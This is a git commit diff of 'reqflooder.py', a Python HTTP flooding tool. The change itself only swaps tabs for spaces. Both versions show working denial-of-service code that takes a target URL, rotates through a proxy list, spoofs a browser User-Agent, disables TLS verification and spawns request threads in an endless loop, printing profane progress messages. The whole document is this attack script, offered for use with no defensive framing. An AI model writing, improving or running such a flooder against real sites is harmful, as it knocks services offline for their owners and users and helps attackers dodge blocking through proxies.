d28b07f191b0b8b0cc03d4c01839d52c76bca40f
Anikin Luke Abales <47096239+abalesluke@users.noreply.github.com>
2021-05-21 23:32:53 +0800

    Update reqflooder.py

--- reqflooder.py
+++ reqflooder.py
@@ -7,10 +7,10 @@ read.add_option('-u', '--url',help="Enter Website url", dest='url')
 (value, key) = read.parse_args()
 url = value.url
 if url is None:
-	print("before executing this code you can also use -u flag\neg.[python3 reqflood.py -u <url>]\n")
-	url = input('Enter url: ')
+ print("before executing this code you can also use -u flag\neg.[python3 reqflood.py -u <url>]\n")
+ url = input('Enter url: ')
 else:
-	pass
+ pass
 
 proxy = open('http_proxies.txt', 'r')
 proxieslist = proxy.readlines()
@@ -18,20 +18,20 @@ proxieslist = proxy.readlines()
 count = 0
 
 def flood():
-	try:
-		header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
-		for x in proxieslist:
-			proxiez = {'http':'http:'+str(x),'https':'http:'+str(x)}
-			r = requests.get(url, proxies=proxiez, headers=header, verify=False)
-			global count
-			count+=1
-			print(f'{Fore.GREEN}[{Fore.CYAN}{count}{Fore.GREEN}] {Fore.CYAN}fucking this shit: {Fore.GREEN}{url} [{Fore.MAGENTA}{r.status_code}{Fore.GREEN}]')
-	except:
-		pass
+ try:
+  header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
+  for x in proxieslist:
+   proxiez = {'http':'http:'+str(x),'https':'http:'+str(x)}
+   r = requests.get(url, proxies=proxiez, headers=header, verify=False)
+   global count
+   count+=1
+   print(f'{Fore.GREEN}[{Fore.CYAN}{count}{Fore.GREEN}] {Fore.CYAN}fucking this shit: {Fore.GREEN}{url} [{Fore.MAGENTA}{r.status_code}{Fore.GREEN}]')
+ except:
+  pass
 
 
 while True:
-	try:
-		threading.Thread(target=flood).start()
-	except:
-		print('while loop err.')
+ try:
+  threading.Thread(target=flood).start()
+ except:
+  print('while loop err.')
